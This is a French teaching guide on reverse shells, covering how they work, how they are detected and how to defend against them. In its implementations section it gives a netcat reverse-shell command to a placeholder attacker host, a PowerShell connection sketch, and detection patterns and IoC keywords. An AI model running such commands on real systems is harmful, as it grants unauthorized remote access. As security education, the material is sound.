# Reverse Shell - Concepts Expliques

Guide pedagogique pour comprendre les reverse shells dans un contexte de laboratoire educatif.

## LAB PERSONNEL UNIQUEMENT

Ce document est destine a l'apprentissage dans votre laboratoire personnel isole.

---

## Qu'est-ce qu'un Shell?

### Definition

Un **shell** est une interface qui permet d'executer des commandes sur un systeme d'exploitation.

**Exemples:**
- Windows: `cmd.exe`, `powershell.exe`
- Linux: `bash`, `sh`, `zsh`

### Shell Interactif

Quand vous ouvrez un terminal, vous interagissez avec un shell:

```powershell
PS C:\Users\User> whoami
hostname\user

PS C:\Users\User> Get-Process
# Liste des processus...
```

## Qu'est-ce qu'un Remote Shell?

### Concept

Un **remote shell** permet d'executer des commandes sur une machine **distante** comme si vous etiez physiquement devant.

```
[Votre Machine] ---> commandes ---> [Machine Distante]
[Votre Machine] <--- resultats <--- [Machine Distante]
```

### Usages Legitimes

**Administration systeme:**
- SSH (Secure Shell) - Linux/Unix
- RDP (Remote Desktop Protocol) - Windows
- WinRM (Windows Remote Management)
- PSRemoting (PowerShell Remoting)

**Caracteristiques legitimes:**
- Authentification requise
- Encryption des communications
- Logging complet
- Autorisation explicite

## Reverse Shell vs Bind Shell

### Bind Shell

**Principe:**
La machine cible **ecoute** sur un port et **attend** une connexion.

```
[Attaquant] ----connexion----> [Cible:4444]
                               (ecoute)
```

**Code conceptuel (cible):**
```
1. Ouvrir port 4444
2. Attendre connexion
3. Quand connexion recue, donner acces shell
```

**Probleme:**
- Firewall bloque souvent les connexions entrantes
- Facile a detecter (port ouvert inhabituel)
- Necessite que cible soit accessible

### Reverse Shell

**Principe:**
La machine cible **initie la connexion** vers l'attaquant.

```
[Attaquant:4444] <---connexion---- [Cible]
(ecoute)                           (initie)
```

**Code conceptuel (cible):**
```
1. Se connecter a attaquant:4444
2. Envoyer shell a l'attaquant
3. Executer commandes recues
4. Retourner resultats
```

**Avantages (pour attaquant):**
- Contourne firewall (connexion sortante generalement autorisee)
- Cible vient a l'attaquant
- Plus discret

## Anatomie d'un Reverse Shell

### Composants

**1. Listener (Attaquant)**
```
- Ecoute sur un port (ex: 4444)
- Attend connexion de la cible
- Recoit le shell
- Envoie commandes
- Recoit resultats
```

**2. Payload (Cible)**
```
- S'execute sur machine cible
- Se connecte au listener
- Redirige shell vers connexion
- Execute commandes
- Retourne output
```

### Flux de Communication

```
ETAPE 1: Deploiement
[Attaquant] ---> payload.exe ---> [Cible]
                                  (execute)

ETAPE 2: Connexion
[Attaquant:4444] <--- TCP connect <--- [Cible]
(listening)

ETAPE 3: Shell actif
[Attaquant] --- "whoami" ---> [Cible]
[Attaquant] <--- "hostname\user" --- [Cible]

[Attaquant] --- "ipconfig" ---> [Cible]
[Attaquant] <--- [resultats] --- [Cible]
```

## Implementations Techniques

### Niveau 1: Netcat (Le plus simple)

**Attaquant (listener):**
```bash
nc -lvnp 4444
```

**Cible (Windows):**
```powershell
nc.exe attacker-ip 4444 -e cmd.exe
```

**Explication:**
- `nc` = netcat (utilitaire reseau)
- `-l` = listen (ecouter)
- `-v` = verbose (afficher details)
- `-n` = no DNS resolution
- `-p 4444` = port 4444
- `-e cmd.exe` = executer cmd.exe et rediriger vers connexion

### Niveau 2: PowerShell (Plus courant)

**Concept:**
```powershell
# 1. Creer connexion TCP vers attaquant
$client = New-Object System.Net.Sockets.TCPClient('attacker-ip', 4444)

# 2. Obtenir le stream de la connexion
$stream = $client.GetStream()

# 3. Creer shell PowerShell
$shell = New-Object System.Management.Automation.PSEngine

# 4. Boucle: lire commandes, executer, retourner resultats
while ($true) {
    $command = Read-From-Stream
    $result = Execute-Command $command
    Send-To-Stream $result
}
```

### Niveau 3: Meterpreter (Professionnel)

**Metasploit Meterpreter:**
- Payload injecte en memoire
- Communication encryptee
- Post-exploitation riche
- Multi-plateforme
- Gestion de sessions

**Fonctionnalites:**
```
- File upload/download
- Screenshot
- Keylogging
- Privilege escalation
- Pivoting
- Port forwarding
- Process migration
- Registry manipulation
```

## Pourquoi ca Fonctionne?

### 1. Connexions Sortantes Autorisees

**Firewalls typiques:**
```
Entrant (Inbound): BLOQUE par defaut
Sortant (Outbound): AUTORISE par defaut
```

**Raison:**
- Les applications legitimes ont besoin de se connecter a Internet
- Bloquer sortant casserait navigateurs, email, updates, etc.

**Exploitation:**
```
Reverse shell = connexion sortante
--> Passe le firewall
--> Atteint l'attaquant
```

### 2. Execution de Code

**Pour qu'un reverse shell fonctionne:**
1. Code doit s'executer sur la cible
2. Cible doit avoir acces reseau
3. Listener doit etre accessible

**Methodes d'execution:**
- Phishing (email avec piece jointe)
- Exploitation de vulnerabilite
- Physical access (USB)
- Supply chain attack
- Insider threat

### 3. Pas d'Authentification

**Shells legitimes:**
```
SSH: Requires username + password/key
RDP: Requires credentials
WinRM: Requires authentication
```

**Reverse shell:**
```
Aucune authentification requise
Machine cible se connecte automatiquement
Attaquant obtient acces direct
```

## Detection

### Comment c'est Detecte?

**1. Network Monitoring**

```
Connexion sortante vers IP externe inhabituelle
Port non-standard (ex: 4444)
Trafic suspect (commandes shell via TCP)
Volume de donnees anormal
```

**2. Endpoint Detection (EDR)**

```
Processus suspect (PowerShell, cmd) avec connexion reseau
Comportement anormal (cmd.exe se connecte a Internet)
Child process inhabituel
Injection de code en memoire
```

**3. Windows Event Logs**

```
Event ID 4688: Process Creation
  - PowerShell lance avec arguments suspects

Event ID 5156: Windows Filtering Platform
  - Connexion sortante inhabituelle

Event ID 3: Network Connection (Sysmon)
  - cmd.exe ou powershell.exe etablit connexion TCP
```

**4. Antivirus/Antimalware**

```
Signatures connues
Heuristics (comportement suspect)
Machine learning (anomalie)
Sandbox analysis
```

### Indicateurs de Compromission (IoCs)

**Processus:**
```
powershell.exe avec arguments:
  - New-Object System.Net.Sockets.TCPClient
  - IEX (Invoke-Expression)
  - DownloadString
  - -EncodedCommand

cmd.exe avec connexion reseau active
```

**Reseau:**
```
Connexions vers IPs externes sur ports non-standards
Beacon regulier (C2 heartbeat)
Transfert de donnees inhabituel
```

**Fichiers:**
```
Scripts PowerShell dans %TEMP%
Executables dans dossiers utilisateur
Fichiers encodes en base64
```

## Defense

### Prevention

**1. Application Whitelisting**
```
Autoriser UNIQUEMENT applications approuvees
Bloquer execution depuis %TEMP%, Downloads, etc.
AppLocker ou Windows Defender Application Control
```

**2. PowerShell Constrained Language Mode**
```powershell
# Limiter capacites PowerShell
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
```

**3. Firewall Egress Filtering**
```
Bloquer connexions sortantes vers Internet
Autoriser UNIQUEMENT destinations approuvees
Proxy obligatoire pour navigation web
```

**4. Least Privilege**
```
Utilisateurs standards (pas admin)
Limite capacites d'execution
Reduit surface d'attaque
```

### Detection

**1. Sysmon**
```xml
<!-- Monitorer connexions reseau de processus -->
<RuleGroup name="" groupRelation="or">
  <NetworkConnect onmatch="include">
    <Image condition="end with">cmd.exe</Image>
    <Image condition="end with">powershell.exe</Image>
  </NetworkConnect>
</RuleGroup>
```

**2. EDR Solutions**
```
CrowdStrike Falcon
SentinelOne
Microsoft Defender for Endpoint
Carbon Black
```

**3. SIEM Rules**
```
Alerter sur:
- PowerShell avec arguments reseau
- cmd.exe avec connexions TCP
- Processus enfants suspects
- Encodage base64 dans command line
```

### Response

**1. Immediate**
```
Isoler machine du reseau
Tuer processus suspect
Collecter logs et artifacts
Analyser IOCs
```

**2. Investigation**
```
Memory dump
Disk forensics
Network traffic capture
Timeline reconstruction
```

**3. Remediation**
```
Reimager machine
Changer credentials compromis
Patcher vulnerabilite exploitee
Renforcer controles
```

## Comparaison avec SSH Legitime

### SSH (Secure Shell) - LEGITIME

```
Caract√©ristiques:
- Authentification requise (cle/password)
- Encryption forte (AES, ChaCha20)
- Audit logging complet
- Session management
- Port standard (22)
- Configuration explicite
```

### Reverse Shell - MALVEILLANT

```
Caracteristiques:
- Aucune authentification
- Souvent pas d'encryption (texte clair)
- Pas de logging (stealth)
- Connexion non autorisee
- Port aleatoire/non-standard
- Execution cachee
```

## Conclusion

### Ce que vous avez appris:

1. **Concept de reverse shell** - connexion initiee par la cible
2. **Pourquoi ca fonctionne** - firewalls, execution, pas d'auth
3. **Comment c'est detecte** - EDR, reseau, logs
4. **Comment s'en defendre** - prevention et detection

### Prochaines etapes:

1. **Lab pratique** - tester dans environnement isole
2. **Metasploit** - utiliser outils professionnels
3. **Detection** - configurer Sysmon et analyser logs
4. **Defense** - implementer controles

### Rappel ethique:

**Ces connaissances sont pour:**
- Comprendre les menaces
- Mieux defendre
- Tester VOS systemes
- Certifications professionnelles

**PAS pour:**
- Acceder a systemes non autorises
- Nuire a autrui
- Activites illegales

---

**La meilleure defense est la comprehension de l'attaque.**
